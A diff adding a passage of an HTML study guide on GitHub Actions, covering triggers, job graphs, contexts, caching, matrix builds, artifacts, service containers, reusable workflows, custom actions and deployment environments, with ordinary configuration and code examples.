+        default: staging
+        required: true
+</code></pre>
+<p>Read these through the <code>inputs</code> context: <code>${{ inputs.environment }}</code>. This is the clean way to make a workflow parameterized and human-triggered — a manual deploy, a one-off backfill.</p>
+<p><strong>Also worth knowing:</strong> <code>workflow_run</code> (start a workflow when <em>another named workflow</em> finishes — handy for splitting build from deploy) and <code>repository_dispatch</code> (trigger via an authenticated API call from an external system).</p>
+<h3 id="jobs-steps-runners-and-the-job-graph">Jobs, Steps, Runners, and the Job Graph</h3>
+<p>A job picks a runner and lists ordered steps:</p>
+<pre><code class="language-yaml">jobs:
+  test:
+    runs-on: ubuntu-latest    # ubuntu-latest | windows-latest | macos-latest | self-hosted | &lt;label&gt;
+    steps:
+      - uses: actions/checkout@v4   # a `uses` step: run a published action
+      - name: Run tests             # `name` is the label shown in the logs (optional)
+        id: tests                   # `id` lets later steps/jobs reference this step's outputs
+        run: ./run-tests.sh         # a `run` step: execute a shell command
+</code></pre>
+<ul>
+<li><code>runs-on</code> selects the runner image — a GitHub-hosted image, or <code>self-hosted</code> plus labels for your own machines (<a href="#part-8--operations-at-scale">Part 8</a>).</li>
+<li>A step is <strong>either</strong> <code>uses:</code> (an action) <strong>or</strong> <code>run:</code> (a shell command), never both.</li>
+<li><code>name</code> is cosmetic; <code>id</code> is functional — it's how you read a step's outputs later.</li>
+</ul>
+<p><strong>Sequencing with <code>needs</code> — the job DAG.</strong> Jobs run in parallel unless you declare dependencies. <code>needs</code> wires them into a directed graph:</p>
+<pre><code class="language-yaml">jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo &quot;linting&quot;
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo &quot;testing&quot;
+  deploy:
+    needs: [lint, test]       # waits until BOTH lint and test succeed
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo &quot;deploying&quot;
+</code></pre>
+<p><code>lint</code> and <code>test</code> run concurrently; <code>deploy</code> is a fan-in that starts only after both pass. If a needed job fails, its dependents are skipped by default.</p>
+<p><strong>Conditional execution with <code>if:</code>.</strong> Both jobs and steps accept an <code>if:</code>:</p>
+<pre><code class="language-yaml">  deploy:
+    needs: [lint, test]
+    if: github.ref == 'refs/heads/main'   # job-level: only on the main branch
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./deploy.sh
+      - run: ./notify-failure.sh
+        if: failure()                       # step-level: run only if an earlier step failed
+</code></pre>
+<p>Inside <code>if:</code> the <code>${{ }}</code> wrapper is implied, so you can omit it (both forms are valid).</p>
+<h3 id="contexts-and-expressions">Contexts and Expressions</h3>
+<p><code>${{ ... }}</code> is the expression syntax. Inside it you read <strong>contexts</strong> — structured objects Actions exposes. The ones you'll use constantly (<a href="https://docs.github.com/en/actions/learn-github-actions/contexts">contexts reference</a>):</p>
+<table>
+<thead>
+<tr>
+<th>Context</th>
+<th>What it holds</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>github</code></td>
+<td>Event and repo metadata</td>
+<td><code>github.sha</code>, <code>github.ref</code>, <code>github.event_name</code>, <code>github.actor</code></td>
+</tr>
+<tr>
+<td><code>env</code></td>
+<td>Environment variables you set</td>
+<td><code>env.NODE_ENV</code></td>
+</tr>
+<tr>
+<td><code>vars</code></td>
+<td>Non-secret configuration variables</td>
+<td><code>vars.REGISTRY</code></td>
+</tr>
+<tr>
+<td><code>secrets</code></td>
+<td>Encrypted secrets</td>
+<td><code>secrets.GITHUB_TOKEN</code></td>
+</tr>
+<tr>
+<td><code>matrix</code></td>
+<td>The current matrix combination</td>
+<td><code>matrix.os</code></td>
+</tr>
+<tr>
+<td><code>needs</code></td>
+<td>Outputs of jobs you depend on</td>
+<td><code>needs.build.outputs.version</code></td>
+</tr>
+<tr>
+<td><code>steps</code></td>
+<td>Outputs of earlier steps (by <code>id</code>)</td>
+<td><code>steps.tests.outputs.coverage</code></td>
+</tr>
+<tr>
+<td><code>runner</code></td>
+<td>Runner info</td>
+<td><code>runner.os</code>, <code>runner.temp</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Operators and functions.</strong> Expressions support <code>==</code>, <code>!=</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>!</code>, plus built-in functions (<a href="https://docs.github.com/en/actions/learn-github-actions/expressions">expressions reference</a>): <code>contains()</code>, <code>startsWith()</code>, <code>endsWith()</code>, <code>format()</code>, <code>join()</code>, <code>toJSON()</code>, <code>fromJSON()</code>, and <code>hashFiles()</code>. There are also <strong>status functions</strong> that only make sense in <code>if:</code>: <code>success()</code> (the implicit default), <code>failure()</code>, <code>always()</code> (run even after a failure or cancellation), and <code>cancelled()</code>.</p>
+<p>A representative <code>if:</code> combining a context and a status function:</p>
+<pre><code class="language-yaml">      - run: ./publish-docs.sh
+        # only on pushes (not PRs) to main, and only if earlier steps succeeded
+        if: success() &amp;&amp; github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'
+</code></pre>
+<p><strong>Passing data between steps — <code>$GITHUB_OUTPUT</code>.</strong> A step writes <code>name=value</code> lines to the file named by <code>$GITHUB_OUTPUT</code>; later steps read them through the <code>steps</code> context, keyed by the producing step's <code>id</code>:</p>
+<pre><code class="language-yaml">      - id: meta
+        run: echo &quot;version=$(cat VERSION)&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;   # define an output named &quot;version&quot;
+      - run: echo &quot;Releasing ${{ steps.meta.outputs.version }}&quot;  # read it back in a later step
+</code></pre>
+<p>(Passing data between <em>jobs</em> means promoting a step output to a <strong>job output</strong> — covered in <a href="#part-3--build-test-cache-artifacts">Part 3</a>, where it pairs naturally with artifacts.)</p>
+<h3 id="environment-variables-defaults-and-shells">Environment Variables, Defaults, and Shells</h3>
+<p><strong><code>env</code> at three scopes</strong>, narrowest wins:</p>
+<pre><code class="language-yaml">env:
+  STAGE: global              # visible to every job and step in the workflow
+jobs:
+  build:
+    env:
+      STAGE: job             # overrides the global value for this job
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo &quot;$STAGE&quot;   # prints &quot;job&quot;
+      - run: echo &quot;$STAGE&quot;
+        env:
+          STAGE: step        # overrides again, only for this step → prints &quot;step&quot;
+</code></pre>
+<p><strong>Exporting env between steps — <code>$GITHUB_ENV</code>.</strong> Each <code>run</code> is a fresh shell, so a variable set in one step does <em>not</em> survive to the next. To persist one, append to <code>$GITHUB_ENV</code>:</p>
+<pre><code class="language-yaml">      - run: echo &quot;BUILD_ID=$(date +%s)&quot; &gt;&gt; &quot;$GITHUB_ENV&quot;  # exported as $BUILD_ID to later steps
+      - run: echo &quot;Build was $BUILD_ID&quot;
+</code></pre>
+<p><strong>Defaults and shells.</strong> <code>defaults.run</code> sets the shell and working directory for every <code>run</code> step:</p>
+<pre><code class="language-yaml">defaults:
+  run:
+    shell: bash                # default is bash on Linux/macOS, pwsh on Windows
+    working-directory: ./app   # run commands from ./app instead of the repo root
+</code></pre>
+<p>Worth knowing when debugging: on Linux the default <code>bash</code> runs with <code>-e</code> and pipefail, so a failing command aborts the step — which is what you want, but it explains "why did my step stop in the middle."</p>
+<p><strong>First look at <code>GITHUB_TOKEN</code> and <code>permissions</code>.</strong> Every run gets an automatic, short-lived token in <code>secrets.GITHUB_TOKEN</code> that authenticates against your repo (to post a check, push a tag, comment on a PR). Its power is governed by <code>permissions:</code>:</p>
+<pre><code class="language-yaml">permissions:
+  contents: read     # least privilege: read the repo, nothing more
+</code></pre>
+<p>Set it restrictively at the workflow level and grant extra scopes only on the jobs that need them. The default scopes, the real risks, and the least-privilege patterns are all in <a href="#part-7--security-hardening">Part 7</a>.</p>
+<hr>
+<h2 id="part-3-build-test-cache-artifacts">Part 3 — Build, Test, Cache, Artifacts</h2>
+<p>This is the part you'll use every day: get a toolchain onto the runner, install dependencies fast, run tests across versions, and move results around. The examples deliberately span ecosystems — the <em>shape</em> is identical across languages, which is the point.</p>
+<h3 id="setting-up-toolchains-pattern-first-multi-stack">Setting Up Toolchains (Pattern-First, Multi-Stack)</h3>
+<p>Every build/test job has the same skeleton: check out the code, install the language toolchain (with its dependency cache), install dependencies, run tests. The <code>actions/setup-*</code> family handles the toolchain <em>and</em> the dependency cache for you.</p>
+<pre><code class="language-yaml"># Node — actions/setup-node
+- uses: actions/setup-node@v4
+  with:
+    node-version: '20'
+    cache: npm           # transparently caches ~/.npm, keyed on package-lock.json
+- run: npm ci            # clean install honoring the lockfile exactly
+- run: npm test
+</code></pre>
+<pre><code class="language-yaml"># Python — actions/setup-python
+- uses: actions/setup-python@v5
+  with:
+    python-version: '3.12'
+    cache: pip           # caches the pip download cache, keyed on requirements files
+- run: pip install -r requirements.txt
+- run: pytest
+</code></pre>
+<pre><code class="language-yaml"># Go — actions/setup-go
+- uses: actions/setup-go@v5
+  with:
+    go-version: '1.22'   # caches the module and build cache by default (cache: true)
+- run: go test ./...
+</code></pre>
+<pre><code class="language-yaml"># Rust — community-standard toolchain + cache actions
+- uses: dtolnay/rust-toolchain@stable   # installs rustc/cargo for the chosen channel
+- uses: Swatinem/rust-cache@v2          # caches ~/.cargo and ./target, keyed on Cargo.lock
+- run: cargo test
+</code></pre>
+<p>Only the tool names change. Lean on each <code>setup-*</code> action's built-in <code>cache:</code> — it's the cheapest performance win you'll get.</p>
+<h3 id="caching-dependencies">Caching Dependencies</h3>
+<p>When the built-in cache isn't enough — or you need to cache something a <code>setup-*</code> action doesn't manage — use <a href="https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows"><code>actions/cache</code></a> directly:</p>
+<pre><code class="language-yaml">- uses: actions/cache@v4
+  with:
+    path: ~/.cache/pip                                              # what to cache
+    key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}  # exact, content-addressed key
+    restore-keys: |
+      ${{ runner.os }}-pip-                                         # prefix fallbacks on a miss
+</code></pre>
+<p>The mechanics that matter:</p>
+<ul>
+<li>On a <strong>miss</strong> for <code>key</code>, Actions walks the <code>restore-keys</code> prefixes and restores the most recent match — a stale-but-warm cache beats a cold one. At job end, if <code>key</code> didn't already exist, the <code>path</code> is saved under it.</li>
+<li><code>hashFiles()</code> over the lockfile makes the key change <em>exactly</em> when dependencies change. That's the whole idiom: same deps → same key → hit; changed deps → new key → fresh save.</li>
+<li>A key, once written, is <strong>immutable</strong> — you cannot overwrite it. This is why the key must encode the dependency set.</li>
+<li>Caches are <strong>scoped per branch</strong>, with read-through to the base/default branch. A PR can read the base branch's cache but not an unrelated branch's.</li>
+<li>There's a per-repo size cap, and caches are evicted after about a week unused (or when the repo total is exceeded). Don't cache anything you can recompute cheaply.</li>
+</ul>
+<p>Rule of thumb: if a <code>setup-*</code> action offers <code>cache:</code>, use it; reach for <code>actions/cache</code> for compiler caches (ccache, sccache), custom build outputs, or downloaded fixtures.</p>
+<h3 id="matrix-builds">Matrix Builds</h3>
+<p>A matrix runs one job definition across a set of dimensions, in parallel (<a href="https://docs.github.com/en/actions/using-jobs/using-a-matrix-for-your-jobs">matrix docs</a>):</p>
+<pre><code class="language-yaml">jobs:
+  test:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false        # don't cancel the other combos when one fails
+      max-parallel: 4         # optional cap on concurrent combos
+      matrix:
+        os: [ubuntu-latest, macos-latest, windows-latest]
+        node: [18, 20, 22]
+        include:
+          - os: ubuntu-latest # enrich one specific combo with an extra property
+            node: 22
+            coverage: true
+        exclude:
+          - os: windows-latest  # drop a combo you don't support
+            node: 18
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: ${{ matrix.node }}   # read the current combo from the matrix context
+      - run: npm ci &amp;&amp; npm test
+</code></pre>
+<ul>
+<li>The base matrix is 3 OSes × 3 Node versions = 9 jobs; <code>exclude</code> removes one (→ 8), <code>include</code> enriches one.</li>
+<li><code>fail-fast: true</code> (the default) cancels the remaining combos the instant one fails — fast feedback, but you lose the full failure picture. Set it <code>false</code> when you want every combo's result (e.g. "does this break only on Windows + Node 18?").</li>
+</ul>
+<p><strong>Dynamic matrices.</strong> When the set isn't static — say "test every package directory" — emit it as JSON from one job and feed it to another with <code>fromJSON</code>:</p>
+<pre><code class="language-yaml">jobs:
+  discover:
+    runs-on: ubuntu-latest
+    outputs:
+      pkgs: ${{ steps.set.outputs.pkgs }}
+    steps:
+      - uses: actions/checkout@v4
+      - id: set
+        run: |
+          # emit a JSON array of package names as a step output
+          echo &quot;pkgs=$(ls packages | jq -R -s -c 'split(&quot;\n&quot;) | map(select(length &gt; 0))')&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;
+  test:
+    needs: discover
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        pkg: ${{ fromJSON(needs.discover.outputs.pkgs) }}   # build the matrix from upstream JSON
+    steps:
+      - run: echo &quot;testing ${{ matrix.pkg }}&quot;
+</code></pre>
+<h3 id="artifacts-and-moving-data-between-jobs">Artifacts and Moving Data Between Jobs</h3>
+<p>Because jobs are isolated, handing files from one to another means uploading an <strong>artifact</strong> and downloading it downstream:</p>
+<pre><code class="language-yaml">jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm ci &amp;&amp; npm run build      # produces ./dist
+      - uses: actions/upload-artifact@v4
+        with:
+          name: site                       # the artifact's name
+          path: dist/                       # file(s)/dir(s) to store
+          retention-days: 7                 # optional; otherwise the repo default (max 90)
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: site                        # restores the artifact into the working dir
+      - run: ./publish.sh
+</code></pre>
+<p>Two mechanisms, two purposes:</p>
+<ul>
+<li><strong>Artifacts</strong> are for <em>files</em> — build output, test reports, coverage, logs. They survive the run (per retention) and are downloadable from the run's UI. Note the artifact actions are at <strong>v4</strong>, which changed behavior: an uploaded artifact is immutable, and you can't have multiple jobs append to one name.</li>
+<li><strong>Job outputs</strong> are for <em>small strings</em> — a version, a computed flag. A job exposes <code>outputs:</code> sourced from a step output, and dependents read <code>needs.&amp;lt;job&amp;gt;.outputs.&amp;lt;name&amp;gt;</code>:</li>
+</ul>
+<pre><code class="language-yaml">jobs:
+  version:
+    runs-on: ubuntu-latest
+    outputs:
+      tag: ${{ steps.v.outputs.tag }}       # promote a step output to a job output
+    steps:
+      - id: v
+        run: echo &quot;tag=v1.4.2&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;
+  release:
+    needs: version
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo &quot;Releasing ${{ needs.version.outputs.tag }}&quot;
+</code></pre>
+<p>Rule of thumb: a <strong>file</strong> → artifact; a <strong>string</strong> → job output.</p>
+<h3 id="service-containers">Service Containers</h3>
+<p>Integration tests often need a real database or cache. <a href="https://docs.github.com/en/actions/using-containerized-services/about-service-containers"><code>services:</code></a> starts containers next to your job on the same network; your steps reach them on <code>localhost</code>:</p>
+<pre><code class="language-yaml">jobs:
+  integration:
+    runs-on: ubuntu-latest
+    services:
+      postgres:
+        image: postgres:16
+        env:
+          POSTGRES_PASSWORD: postgres        # configure the container through its own env vars
+        ports:
+          - 5432:5432                         # publish the container port to localhost on the runner
+        options: &gt;-                           # health check — the job waits until Postgres is ready
+          --health-cmd &quot;pg_isready -U postgres&quot;
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+      redis:
+        image: redis:7
+        ports:
+          - 6379:6379
+        options: &gt;-
+          --health-cmd &quot;redis-cli ping&quot;
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+    env:
+      DATABASE_URL: postgres://postgres:postgres@localhost:5432/postgres
+      REDIS_URL: redis://localhost:6379
+    steps:
+      - uses: actions/checkout@v4
+      - run: ./run-integration-tests.sh       # connects to localhost:5432 and localhost:6379
+</code></pre>
+<p>The health checks are not optional in practice: without them, your tests can start before the database accepts connections and fail intermittently — one of the most common flaky-CI causes. For what to actually exercise behind these connections, see the <a href="POSTGRES_STUDY_GUIDE.md">Postgres guide</a> and <a href="REDIS_STUDY_GUIDE.md">Redis guide</a>.</p>
+<hr>
+<h2 id="part-4-composition-reuse">Part 4 — Composition &amp; Reuse</h2>
+<p>Once you have more than a couple of workflows, copy-paste sets in: the same build job, the same setup steps, pasted everywhere and drifting out of sync. Actions offers reuse at three granularities — <strong>composite actions</strong> (a bundle of steps), <strong>reusable workflows</strong> (whole jobs), and <strong>custom actions</strong> (a distributable unit, <a href="#part-5--writing-custom-actions">Part 5</a>). This part covers the first two and exactly when to use which.</p>
+<h3 id="reusable-workflows">Reusable Workflows</h3>
+<p>A <a href="https://docs.github.com/en/actions/using-workflows/reusing-workflows">reusable workflow</a> is a workflow other workflows can call as a job, via <code>on: workflow_call</code>. It declares a typed interface — inputs, secrets, outputs:</p>
+<pre><code class="language-yaml"># .github/workflows/reusable-build.yml
+name: Reusable build
+on:
+  workflow_call:                # makes this workflow callable from other workflows
+    inputs:
+      node-version:
+        type: string            # one of: string | number | boolean
+        required: false
+        default: '20'
+    secrets:
+      npm-token:
+        required: true          # callers must supply this secret
+    outputs:
+      artifact-name:
+        description: Name of the uploaded build artifact
+        value: ${{ jobs.build.outputs.artifact-name }}   # surfaced from a job output below
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    outputs:
+      artifact-name: site
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: ${{ inputs.node-version }}
+      - run: npm ci &amp;&amp; npm run build
+        env:
+          NPM_TOKEN: ${{ secrets.npm-token }}
+      - uses: actions/upload-artifact@v4
+        with:
+          name: site
+          path: dist/
+</code></pre>
+<p>A caller references it at the <strong>job level</strong> with <code>uses:</code>:</p>
+<pre><code class="language-yaml"># .github/workflows/app-ci.yml
+name: CI
+on: [push]
+jobs:
+  build:
+    uses: ./.github/workflows/reusable-build.yml   # local path (or owner/repo/.github/workflows/x.yml@ref)
+    with:
+      node-version: '22'
+    secrets:
+      npm-token: ${{ secrets.NPM_TOKEN }}
+      # alternatively, forward ALL of the caller's secrets:  secrets: inherit
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo &quot;Built artifact ${{ needs.build.outputs.artifact-name }}&quot;
+</code></pre>
+<p>What to internalize:</p>
+<ul>
+<li>A called workflow runs as its <strong>own job(s)</strong>, shown nested under the caller. To read its outputs, <code>needs:</code> the calling job and reference <code>needs.&amp;lt;job&amp;gt;.outputs.&amp;lt;name&amp;gt;</code>.</li>
+<li><code>secrets: inherit</code> forwards every secret the caller has — convenient but the opposite of least privilege. Prefer naming only the secrets you need.</li>
+<li>Reusable workflows can be called <strong>across repos</strong> (<code>owner/repo/.github/workflows/wf.yml@v1</code>), which is how organizations share a canonical pipeline. Pin that ref like any other dependency (<a href="#part-7--security-hardening">Part 7</a>).</li>
+<li>There's a fixed <strong>nesting limit</strong> (you can chain calls only a few levels deep) and a cap on how many workflow files one run may call.</li>
+</ul>
+<h3 id="composite-actions">Composite Actions</h3>
+<p>A <a href="https://docs.github.com/en/actions/creating-actions/creating-a-composite-action">composite action</a> bundles several steps into a single <code>uses:</code> step. It lives in its own directory with an <code>action.yml</code>:</p>
+<pre><code class="language-yaml"># .github/actions/setup-project/action.yml
+name: Setup project
+description: Set up Node and install dependencies
+inputs:
+  node-version:
+    description: Node version
+    required: false
+    default: '20'
+runs:
+  using: composite            # this is what makes it a composite action
+  steps:
+    - uses: actions/setup-node@v4
+      with:
+        node-version: ${{ inputs.node-version }}
+    - run: npm ci
+      shell: bash             # REQUIRED: every `run` step in a composite action must name a shell
+</code></pre>
+<p>Invoke it like any other action, by path to its directory:</p>
+<pre><code class="language-yaml">    steps:
+      - uses: actions/checkout@v4
+      - uses: ./.github/actions/setup-project   # local composite action
+        with:
+          node-version: '22'
+      - run: npm test
+</code></pre>
+<p>The gotcha that catches everyone: <strong>a composite action's <code>run</code> steps must each set <code>shell:</code></strong> — there's no default. Composite actions execute <em>inside the caller's job</em> on the same runner, so they factor out <strong>steps</strong>, not whole jobs.</p>
+<h3 id="org-level-reuse">Org-Level Reuse</h3>
+<p>Two mechanisms operate across an entire organization:</p>
+<ul>
+<li><strong>Starter workflows</strong> — templates that appear in the "New workflow" UI of every repo in the org. Put them in a special <code>.github</code> repository under <code>workflow-templates/</code> (a <code>*.yml</code> next to a <code>*.properties.json</code> that describes it). New repos start from a sanctioned pipeline instead of copying a random one.</li>
+<li><strong>Required workflows / rulesets</strong> — let an org <em>enforce</em> that specific checks run on PRs across many repos, configured centrally through repository rulesets rather than per repo.</li>
+</ul>
+<pre><code class="language-json">// .github/workflow-templates/node-ci.properties.json
+{
+  &quot;name&quot;: &quot;Node CI&quot;,
+  &quot;description&quot;: &quot;Lint and test a Node project&quot;,
+  &quot;iconName&quot;: &quot;example&quot;,
+  &quot;categories&quot;: [&quot;JavaScript&quot;, &quot;CI&quot;]
+}
+</code></pre>
+<h3 id="which-one-to-reach-for">Which One to Reach For</h3>
+<table>
+<thead>
+<tr>
+<th>Mechanism</th>
+<th>Granularity</th>
+<th>Runs as</th>
+<th>Reach for it when…</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Composite action</strong></td>
+<td>A bundle of steps</td>
+<td>Inside the caller's job (same runner)</td>
+<td>You repeat the same <em>sequence of steps</em> across jobs (setup, shared tooling).</td>
+</tr>
+<tr>
+<td><strong>Reusable workflow</strong></td>
+<td>One or more whole jobs</td>
+<td>Its own job(s) under the caller</td>
+<td>You repeat <em>whole jobs/pipelines</em> across workflows or repos (a standard build or deploy).</td>
+</tr>
+<tr>
+<td><strong>Custom action</strong> (<a href="#part-5--writing-custom-actions">Part 5</a>)</td>
+<td>A distributable unit (JS/Docker/composite)</td>
+<td>A single step</td>
+<td>You want a versioned, publishable building block — possibly for the Marketplace.</td>
+</tr>
+</tbody>
+</table>
+<p>Rule of thumb: factoring out <em>steps within a job</em> → composite action; factoring out <em>entire jobs</em> → reusable workflow; building something <em>others install</em> → custom action.</p>
+<hr>
+<h2 id="part-5-writing-custom-actions">Part 5 — Writing Custom Actions</h2>
+<p>When the Marketplace doesn't have what you need — or you want a versioned building block of your own — you <a href="https://docs.github.com/en/actions/creating-actions">write a custom action</a>. There are three flavors, and choosing the right one is most of the decision.</p>
+<h3 id="the-three-kinds">The Three Kinds</h3>
+<table>
+<thead>
+<tr>
+<th>Kind</th>
+<th>What it is</th>
+<th>Where it runs</th>
+<th>Best for</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Composite</strong></td>
+<td>YAML bundling steps (Part 4)</td>
+<td>In the caller's job, same runner</td>
+<td>Wrapping shell commands / other actions; no extra runtime</td>
+</tr>
+<tr>
+<td><strong>JavaScript</strong></td>
+<td>A Node program the runner executes</td>
+<td>Node on the runner — any OS</td>
+<td>Logic, API calls, cross-platform actions; fastest startup</td>
+</tr>
+<tr>
+<td><strong>Docker container</strong></td>
+<td>A container the runner builds and runs</td>
+<td><strong>Linux runners only</strong></td>
+<td>Bringing a specific OS / toolchain along; heavier startup</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>JavaScript</strong> actions run directly under Node on the runner, so they start fast and work on Linux, macOS, and Windows. This is the default choice for anything with real logic.</li>
+<li><strong>Docker</strong> actions can package arbitrary tools, but only run on Linux runners and pay the image build/pull cost on every run. Use them when you need an environment that's painful to set up otherwise.</li>
+<li><strong>Composite</strong> (from Part 4) is the no-runtime option when your action is "just some steps."</li>
+</ul>
+<h3 id="actionyml-anatomy">action.yml Anatomy</h3>
+<p>Every action — whichever kind — has a <a href="https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions">metadata file</a> (<code>action.yml</code>) at its root:</p>
+<pre><code class="language-yaml">name: My Action               # display name (must be unique if published to the Marketplace)
+description: What it does
+author: you
+inputs:
+  who:
+    description: Name to greet
+    required: false
+    default: world
+outputs:
+  greeting:
+    description: The greeting that was produced
+runs:
+  using: node20               # composite | node20 | docker — this selects the kind
+  main: dist/index.js         # (JavaScript) the entrypoint file
+branding:                     # optional; controls the Marketplace listing's icon/color
+  icon: activity
+  color: purple
+</code></pre>
+<h3 id="a-javascript-action">A JavaScript Action</h3>
+<p>JS actions use the official toolkit: <code>@actions/core</code> (inputs, outputs, logging, failing the step) and <code>@actions/github</code> (the event <code>context</code> and a ready-made authenticated Octokit client).</p>
+<pre><code class="language-yaml"># action.yml
+name: Greet
+description: Print a greeting and output it
+inputs:
+  who:
+    description: Name to greet
+    default: world
+outputs:
+  greeting:
+    description: The produced greeting
+runs:
+  using: node20
+  main: dist/index.js
+</code></pre>
+<pre><code class="language-javascript">// index.js
+const core = require('@actions/core');
+const github = require('@actions/github');
+
+try {
+  const who = core.getInput('who');                  // read an input declared in action.yml
+  const greeting = `Hello, ${who}!`;
+  core.info(`Triggered by: ${github.context.eventName}`); // read the event from the context
+  core.setOutput('greeting', greeting);              // expose an output to later steps
+  console.log(greeting);
+} catch (err) {
+  core.setFailed(err.message);                       // mark the step failed with a clear message
+}
+</code></pre>
+<p>The step nearly everyone forgets: an action referenced by <code>uses:</code> must carry its <strong>runtime dependencies committed in the repo</strong>, because the runner does not <code>npm install</code> your action before running it. The standard fix is to bundle everything into one file with <a href="https://github.com/vercel/ncc"><code>@vercel/ncc</code></a> and commit the result:</p>
+<pre><code class="language-bash">npm i -D @vercel/ncc            # dev dependency
+npx ncc build index.js -o dist  # produces dist/index.js with all deps inlined
+git add dist &amp;&amp; git commit -m &quot;build&quot;   # commit the bundle so consumers receive it
+</code></pre>
+<p>Either commit <code>dist/</code> directly (simplest) or build it in a release workflow and attach it to the tag (cleaner history). Consumers then write <code>uses: your-org/greet@v1</code>.</p>
+<h3 id="a-docker-container-action">A Docker-Container Action</h3>
+<p>A <a href="https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action">Docker action</a> packages a tool plus its environment; the runner builds the image from your <code>Dockerfile</code> and runs it:</p>
+<pre><code class="language-yaml"># action.yml
+name: Lint with my tool
+description: Run a containerized linter
+inputs:
+  path:
+    description: Path to lint
+    default: .
+runs:
+  using: docker
+  image: Dockerfile         # build from this Dockerfile (or a prebuilt image: docker://ghcr.io/org/img:tag)
+  args:
+    - ${{ inputs.path }}    # passed to the entrypoint as positional arguments
+</code></pre>
+<pre><code class="language-dockerfile"># Dockerfile
+FROM alpine:3.20
+RUN apk add --no-cache bash
+COPY entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+ENTRYPOINT [&quot;/entrypoint.sh&quot;]
+</code></pre>
+<pre><code class="language-bash"># entrypoint.sh
+#!/usr/bin/env bash
+set -euo pipefail
+echo &quot;Linting path: $1&quot;               # the action.yml `args` arrive as positional parameters
+echo &quot;via env: ${INPUT_PATH}&quot;         # inputs are ALSO exposed as INPUT_&lt;UPPERCASE_NAME&gt;
+echo &quot;result=ok&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;  # outputs go to $GITHUB_OUTPUT, same as anywhere
+</code></pre>
+<p>Inputs reach a Docker action two ways: as <code>args</code> (positional) and automatically as <code>INPUT_&amp;lt;NAME&amp;gt;</code> environment variables (name uppercased). Outputs use <code>$GITHUB_OUTPUT</code> like every other step.</p>
+<h3 id="versioning-distribution">Versioning &amp; Distribution</h3>
+<p>Consumers pin to a ref, so <strong>your tags are your public API</strong>:</p>
+<ul>
+<li>Cut <strong>semver tags</strong> (<code>v1.2.0</code>) for releases.</li>
+<li>Maintain a <strong>floating major tag</strong> (<code>v1</code>) that you re-point to the latest <code>v1.x.y</code>. This is the convention that lets consumers write <code>@v1</code> and pick up non-breaking updates:
+  <code>bash
+  git tag -f v1 v1.2.0      # move the v1 tag onto the new release
+  git push -f origin v1</code></li>
+<li>Security-conscious consumers will pin your <strong>commit SHA</strong> instead of <code>@v1</code> (<a href="#part-7--security-hardening">Part 7</a>). That's expected — design your changelog around it.</li>
+<li>To list on the <a href="https://docs.github.com/en/actions/creating-actions/publishing-actions-in-github-marketplace">Marketplace</a>, the repo needs a single root <code>action.yml</code>, a good README, and a published release.</li>
+</ul>
+<hr>
+<h2 id="part-6-deployment-release-automation">Part 6 — Deployment &amp; Release Automation</h2>
+<p>This is where CI turns into CD. Two themes run through it: getting credentials to your cloud <em>safely</em> (short-lived OIDC, not long-lived keys), and turning a passing build into a published artifact.</p>
+<h3 id="environments">Environments</h3>
+<p>A deployment <a href="https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment">environment</a> is a named target — <code>staging</code>, <code>production</code> — with protection rules attached. A job opts into one with <code>environment:</code>:</p>
+<pre><code class="language-yaml">jobs:
+  deploy-prod:
+    runs-on: ubuntu-latest
+    environment: production      # bind this job to the &quot;production&quot; environment
+    steps:
+      - run: ./deploy.sh
+        env:
+          API_KEY: ${{ secrets.API_KEY }}   # resolves to the environment's secret if one is set
+</code></pre>
+<p>What that buys you:</p>
+<ul>
+<li><strong>Required reviewers</strong> — the job <em>pauses</em> until a named person or team approves. This is your manual production gate, enforced by GitHub.</li>
+<li><strong>Wait timer</strong> — a forced delay before the job proceeds (a cool-off window to abort).</li>
+<li><strong>Deployment branches</strong> — restrict which branches may deploy to this environment (e.g. only <code>main</code> reaches production).</li>
+<li><strong>Environment-scoped secrets/variables</strong> — <code>secrets.API_KEY</code> resolves to <em>this environment's</em> value, so staging and production hold different credentials under the same name.</li>
+</ul>
+<h3 id="secrets-and-variables">Secrets and Variables</h3>
+<p>Three scopes, most-specific wins: <strong>repository</strong>, <strong>environment</strong>, and <strong>organization</strong> (org secrets can be shared across selected repos). Use <code>secrets.*</code> for sensitive values, <code>vars.*</code> for non-secret config.</p>
+<p>Two facts that bite people:</p>
+<ul>
